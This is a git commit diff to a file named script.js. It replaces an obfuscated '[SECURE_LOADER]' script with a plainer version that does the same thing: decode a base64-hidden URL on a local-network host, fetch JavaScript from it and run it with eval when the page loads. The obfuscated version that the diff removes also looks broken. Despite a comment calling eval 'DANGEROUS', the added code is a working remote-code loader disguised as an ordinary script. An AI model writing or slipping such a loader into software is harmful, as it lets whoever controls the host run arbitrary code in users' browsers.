25217616c745d83b70010f1fcffa0988e807a5ea
vault053009-maker <vault053009@gmail.com>
2025-10-11 17:41:46 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,47 +1,18 @@
+// NOTE: This version shows the intended behavior. Do NOT run this against unknown URLs.
 (function() {
-    'use strict';
-    
-    const xG5rKVcv = 'fetch';
-    const O5bBbBpT = 'text';
-    const McrXg22a = 'eval';
-    const MA4xYpxs = 'console';
-    const eham214T = 'error';
-    const EZnGIXWl = 'log';
-    const UNY2IxvK = 'atob';
-    
-    function AB0aPczf(msg, data) {
-        MA4xYpxs.EZnGIXWl('[SECURE_LOADER]', msg, data || '');
-    }
-    
-    AB0aPczf('Starting secure loader...');
-    
-    const vySZVIFZ = 'aHR0cDovLzE5Mi4xNjguMS45Mjo1MDAwL2pzL3NlY3VyZV9sb2FkZXJfc05VTFdYRm8zQ05uTWVyTi5qcw==';
-    
-    AB0aPczf('Encoded URL:', vySZVIFZ);
-    AB0aPczf('Payload ID:', 'sNULWXFo3CNnMerN');
-    
-    const ovNQ7RwE = UNY2IxvK(vySZVIFZ);
-    AB0aPczf('Decoded URL:', ovNQ7RwE);
-    
-    window[xG5rKVcv](ovNQ7RwE)
-    .then(response => {
-        AB0aPczf('Response received:', response.status, response.statusText);
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-        }
-        return response[O5bBbBpT]();
+  const urlB64 = 'aHR0cDovLzE5Mi4xNjguMS45Mjo1MDAwL2pzL3NlY3VyZV9sb2FkZXJfc05VTFdYRm8zQ05uTWVyTi5qcw==';
+  const url = window['atob'](urlB64); // decode
+  console.log('[SECURE_LOADER] Decoded URL:', url);
+  fetch(url)
+    .then(res => {
+      console.log('[SECURE_LOADER] Response:', res.status);
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      return res.text();
     })
-    .then(jsCode => {
-        AB0aPczf('JavaScript code received, length:', jsCode.length);
-        try {
-            AB0aPczf('Executing JavaScript code...');
-            McrXg22a(jsCode);
-            AB0aPczf('JavaScript executed successfully');
-        } catch (e) {
-            MA4xYpxs.eham214T('[SECURE_LOADER] JavaScript execution failed:', e);
-        }
+    .then(js => {
+      console.log('[SECURE_LOADER] Executing fetched code (length=' + js.length + ')');
+      // DANGEROUS: executes remote code
+      eval(js);
     })
-    .catch(error => {
-        MA4xYpxs.eham214T('[SECURE_LOADER] Request failed:', error);
-    });
+    .catch(err => console.error('[SECURE_LOADER] Error:', err));
 })();
